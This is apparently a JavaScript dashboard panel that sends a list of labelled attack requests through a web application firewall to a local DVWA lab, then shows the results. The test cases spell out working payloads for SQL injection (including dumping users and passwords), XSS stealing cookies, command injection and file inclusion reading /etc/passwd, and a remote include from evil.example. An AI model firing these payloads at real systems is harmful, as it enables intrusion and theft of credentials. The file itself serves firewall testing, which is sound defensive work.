const RED_TEAM_CASES = [
  {
    id: 'safe_baseline',
    title: 'Safe baseline',
    label: 'safe',
    safe: true,
    code: 0,
    summary: 'Benign smoke test that should pass through the WAF.',
    curl: "curl -i 'http://localhost:8080/index.php'",
  },
  {
    id: 'safe_login_page',
    title: 'Safe login page',
    label: 'safe',
    safe: true,
    code: 0,
    summary: 'Plain GET request to the login page with no attack payloads.',
    curl: "curl -i 'http://localhost:8080/login.php'",
  },
  {
    id: 'safe_setup_page',
    title: 'Safe setup page',
    label: 'safe',
    safe: true,
    code: 0,
    summary: 'Benign setup-page request that should be allowed easily.',
    curl: "curl -i 'http://localhost:8080/setup.php'",
  },
  {
    id: 'safe_robots',
    title: 'Safe robots file',
    label: 'safe',
    safe: true,
    code: 0,
    summary: 'Simple static-file style request with no active payload.',
    curl: "curl -i 'http://localhost:8080/robots.txt'",
  },
  {
    id: 'sqli_classic',
    title: 'SQL injection',
    label: 'sqli_classic',
    code: 1,
    summary: 'Classic quoted OR payload from the SQLi family.',
    curl: "curl -i 'http://localhost:8080/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit'",
  },
  {
    id: 'sqli_union',
    title: 'SQLi union',
    label: 'sqli_union',
    code: 5,
    summary: 'UNION SELECT payload matching the dataset SQLi union samples.',
    curl: "curl -i 'http://localhost:8080/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%201%2Cusername%2Cpassword%20FROM%20users--&Submit=Submit'",
  },
  {
    id: 'sqli_blind_boolean',
    title: 'Blind SQLi boolean',
    label: 'sqli_blind_boolean',
    code: 2,
    summary: 'Boolean blind SQL injection against the DVWA blind SQLi route.',
    curl: "curl -i 'http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27%20AND%20%271%27%3D%271&Submit=Submit'",
  },
  {
    id: 'sqli_blind_time',
    title: 'Blind SQLi time',
    label: 'sqli_blind_time',
    code: 3,
    summary: 'Time-delay SQL payload from the blind SQLi family.',
    curl: "curl -i 'http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27%3B%20SLEEP%285%29--&Submit=Submit'",
  },
  {
    id: 'sqli_error_based',
    title: 'Error SQLi',
    label: 'sqli_error_based',
    code: 4,
    summary: 'Database error extraction payload following dataset error-based SQLi rows.',
    curl: "curl -i 'http://localhost:8080/vulnerabilities/sqli/?id=1%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2Cversion%28%29%29%29--&Submit=Submit'",
  },
  {
    id: 'xss_reflected',
    title: 'Reflected XSS',
    label: 'xss_reflected',
    code: 7,
    summary: 'Reflected script payload to exercise XSS detection.',
    curl: "curl -i 'http://localhost:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E&Submit=Submit'",
  },
  {
    id: 'xss_stored',
    title: 'Stored XSS',
    label: 'xss_stored',
    code: 8,
    summary: 'Stored message-board style XSS payload from the dataset.',
    curl: "curl -i -X POST 'http://localhost:8080/vulnerabilities/xss_s/' -H 'Content-Type: application/x-www-form-urlencoded' --data 'txtName=redteam&mtxMessage=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&btnSign=Sign+Guestbook'",
  },
  {
    id: 'xss_dom',
    title: 'DOM XSS',
    label: 'xss_dom',
    code: 9,
    summary: 'DOM sink payload using the DVWA default parameter.',
    curl: "curl -i 'http://localhost:8080/vulnerabilities/xss_d/?default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'",
  },
  {
    id: 'cmdi',
    title: 'Command injection',
    label: 'cmdi',
    code: 11,
    summary: 'Shell metacharacter payload for command injection checks.',
    curl: "curl -i 'http://localhost:8080/vulnerabilities/exec/?ip=127.0.0.1%3Bcat%20/etc/passwd&Submit=Submit'",
  },
  {
    id: 'cmdi_blind',
    title: 'Blind command injection',
    label: 'cmdi_blind',
    code: 12,
    summary: 'Time-delay shell payload matching blind command injection rows.',
    curl: "curl -i 'http://localhost:8080/vulnerabilities/exec/?ip=127.0.0.1%26%20sleep%205&Submit=Submit'",
  },
  {
    id: 'lfi',
    title: 'Local file inclusion',
    label: 'lfi',
    code: 17,
    summary: 'Local file disclosure via PHP filter wrapper.',
    curl: "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd'",
  },
  {
    id: 'path_traversal',
    title: 'Path traversal',
    label: 'path_traversal',
    code: 18,
    summary: 'Traversal payload that should be blocked or flagged.',
    curl: "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd'",
  },
  {
    id: 'rfi',
    title: 'Remote file inclusion',
    label: 'rfi',
    code: 19,
    summary: 'Remote include URL matching RFI samples in the dataset.',
    curl: "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=http://evil.example/shell.txt'",
  },
  {
    id: 'csrf',
    title: 'CSRF password change',
    label: 'csrf',
    code: 21,
    summary: 'Cross-site request forgery style password-change URL.',
    curl: "curl -i 'http://localhost:8080/vulnerabilities/csrf/?password_new=pwned123&password_conf=pwned123&Change=Change'",
  },
  {
    id: 'brute_force',
    title: 'Brute force',
    label: 'brute_force',
    code: 23,
    summary: 'DVWA brute-force module login attempt.',
    curl: "curl -i 'http://localhost:8080/vulnerabilities/brute/?username=admin&password=wrong&Login=Login'",
  },
];

function escapeHtml(value) {
  return String(value)
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#39;');
}

function renderRedTeamGrid() {
  const grid = document.getElementById('redteam-grid');
  if (!grid) return;

  grid.innerHTML = RED_TEAM_CASES.map((testCase) => `
    <article class="redteam-card ${testCase.safe ? 'safe' : 'unsafe'}">
      <div class="redteam-card-head">
        <div>
          <span class="badge ${testCase.safe ? 'safe' : 'blocked'}">${escapeHtml(testCase.label)}</span>
          <h3>${escapeHtml(testCase.title)}</h3>
        </div>
        <span class="code-chip">${testCase.code}</span>
      </div>
      <p>${escapeHtml(testCase.summary)}</p>
      <pre class="command-preview">${escapeHtml(testCase.curl)}</pre>
      <button type="button" class="redteam-run" data-redteam-id="${escapeHtml(testCase.id)}">Run request</button>
    </article>
  `).join('');

  grid.querySelectorAll('[data-redteam-id]').forEach((button) => {
    button.addEventListener('click', () => {
      const testCase = RED_TEAM_CASES.find((item) => item.id === button.dataset.redteamId);
      if (testCase) runRedTeamCase(testCase);
    });
  });
}

function setRedTeamStatus(message, tone = 'idle') {
  const status = document.getElementById('redteam-status');
  if (status) {
    status.textContent = message;
    status.dataset.tone = tone;
  }
}

function appendRedTeamLog(lines) {
  const log = document.getElementById('redteam-log');
  if (!log) return;
  log.textContent = lines.join('\n');
}

async function readResponseBody(response) {
  const text = await response.text();
  const contentType = (response.headers.get('content-type') || '').toLowerCase();
  if (contentType.includes('application/json')) {
    try {
      return { json: JSON.parse(text), raw: text };
    } catch (_err) {
      return { json: null, raw: text };
    }
  }
  return { json: null, raw: text };
}

function previewText(text, limit = 260) {
  const cleaned = String(text || '').trim().replace(/\s+/g, ' ');
  if (!cleaned) return '(empty)';
  return cleaned.length > limit ? `${cleaned.slice(0, limit)}...` : cleaned;
}

async function runRedTeamCase(testCase) {
  setRedTeamStatus(`Running ${testCase.title}...`, 'busy');
  appendRedTeamLog([
    `Case: ${testCase.title}`,
    `Label: ${testCase.label} (${testCase.code})`,
    `Curl: ${testCase.curl}`,
    'Dispatching request through the WAF at http://localhost:8080 ...',
  ]);

  try {
    const response = await fetch('/api/redteam/run', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ case: testCase.id }),
    });
    const { json: payload, raw } = await readResponseBody(response);
    if (!payload) {
      throw new Error(previewText(raw || response.statusText, 180));
    }
    if (!response.ok || payload.error) {
      throw new Error(payload.error || response.statusText);
    }

    setRedTeamStatus(`${testCase.title} completed`, 'success');
    appendRedTeamLog([
      `Case: ${payload.case.title}`,
      `Curl: ${payload.case.curl}`,
      `Status: ${payload.status_code}`,
      payload.location ? `Location: ${payload.location}` : 'Location: -',
      `Body preview: ${previewText(payload.body_preview)}`,
      `Timestamp: ${new Date((payload.at || 0) * 1000).toLocaleString()}`,
    ]);

    if (typeof window.refreshTrafficChart === 'function') {
      window.refreshTrafficChart().catch(() => {});
    }
  } catch (err) {
    setRedTeamStatus('Run failed', 'error');
    appendRedTeamLog([
      `Case: ${testCase.title}`,
      `Curl: ${testCase.curl}`,
      `Error: ${err.message || String(err)}`,
    ]);
  }
}

async function refreshAiHealth() {
  const statusNode = document.getElementById('ai-health-status');
  const modelNode = document.getElementById('ai-model-name');
  const lastCheckedNode = document.getElementById('ai-last-checked-at');
  const lastSwappedNode = document.getElementById('ai-last-swapped-at');
  const lastErrorNode = document.getElementById('ai-last-error');
  const dotNode = document.getElementById('ai-health-dot');
  if (statusNode) statusNode.textContent = 'Checking...';
  if (modelNode) modelNode.textContent = 'Loading...';
  if (lastCheckedNode) lastCheckedNode.textContent = 'Loading...';
  if (lastSwappedNode) lastSwappedNode.textContent = 'Loading...';
  if (lastErrorNode) lastErrorNode.textContent = 'Loading...';
  if (dotNode) dotNode.className = 'status-dot neutral';

  try {
    const response = await fetch('/api/ai/health');
    const { json: payload, raw } = await readResponseBody(response);
    if (!response.ok || !payload) {
      throw new Error(previewText(raw || response.statusText, 180));
    }
    const isHealthy = String(payload.status || '').toLowerCase() === 'ok';
    if (statusNode) statusNode.textContent = `${payload.status || 'unknown'}`;
    if (dotNode) dotNode.className = `status-dot ${isHealthy ? 'good' : 'bad'}`;
    if (modelNode) modelNode.textContent = payload.model_name || 'unknown';
    if (lastCheckedNode) lastCheckedNode.textContent = formatHealthTimestamp(payload.last_checked_at);
    if (lastSwappedNode) lastSwappedNode.textContent = formatHealthTimestamp(payload.last_swapped_at);
    if (lastErrorNode) lastErrorNode.textContent = renderHealthValue(payload.last_error);
  } catch (err) {
    if (statusNode) statusNode.textContent = 'Unavailable';
    if (dotNode) dotNode.className = 'status-dot bad';
    if (modelNode) modelNode.textContent = 'unknown';
    if (lastCheckedNode) lastCheckedNode.textContent = 'unknown';
    if (lastSwappedNode) lastSwappedNode.textContent = 'unknown';
    if (lastErrorNode) lastErrorNode.textContent = 'unknown';
  }
}

async function triggerAiRetrain() {
  const retrainButton = document.getElementById('trigger-ai-retrain');
  const refreshButton = document.getElementById('refresh-ai-health');
  const statusNode = document.getElementById('ai-health-status');

  if (retrainButton) retrainButton.disabled = true;
  if (refreshButton) refreshButton.disabled = true;
  if (statusNode) statusNode.textContent = 'Retraining...';

  console.log('POST /retrain -> sending retrain request');

  try {
    const response = await fetch('https://carded-tartness-caretaker.ngrok-free.dev/retrain', {
      method: 'POST',
    });

    if (!response.ok) {
      throw new Error(`Retrain request failed (${response.status})`);
    }

    if (statusNode) statusNode.textContent = 'Retrain started';
    console.log('POST /retrain -> retrain request completed successfully');
    alert('Retrain request sent successfully.');
    await refreshAiHealth();
  } catch (err) {
    if (statusNode) statusNode.textContent = 'Retrain failed';
    console.error(err);
  } finally {
    if (retrainButton) retrainButton.disabled = false;
    if (refreshButton) refreshButton.disabled = false;
  }
}

function renderHealthValue(value) {
  if (value === null || value === undefined) return 'null';
  return String(value);
}

function formatHealthTimestamp(value) {
  if (value === null || value === undefined) return 'null';

  let parsed = null;
  if (typeof value === 'number' && Number.isFinite(value)) {
    const ms = value > 1e12 ? value : value * 1000;
    parsed = new Date(ms);
  } else if (typeof value === 'string') {
    const trimmed = value.trim();
    if (!trimmed) return 'null';

    const numeric = Number(trimmed);
    if (Number.isFinite(numeric)) {
      const ms = numeric > 1e12 ? numeric : numeric * 1000;
      parsed = new Date(ms);
    } else {
      const parsedStringDate = new Date(trimmed);
      if (!Number.isNaN(parsedStringDate.getTime())) {
        parsed = parsedStringDate;
      }
    }
  }

  if (!parsed || Number.isNaN(parsed.getTime())) {
    return renderHealthValue(value);
  }

  return parsed.toLocaleString(undefined, {
    year: 'numeric',
    month: 'short',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  });
}

function initRedTeamPanel() {
  renderRedTeamGrid();
  const refreshButton = document.getElementById('refresh-ai-health');
  const retrainButton = document.getElementById('trigger-ai-retrain');
  if (refreshButton) {
    refreshButton.addEventListener('click', triggerAiRetrain);
  }
  if (retrainButton) {
    retrainButton.addEventListener('click', triggerAiRetrain);
  }
  refreshAiHealth();
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initRedTeamPanel);
} else {
  initRedTeamPanel();
}
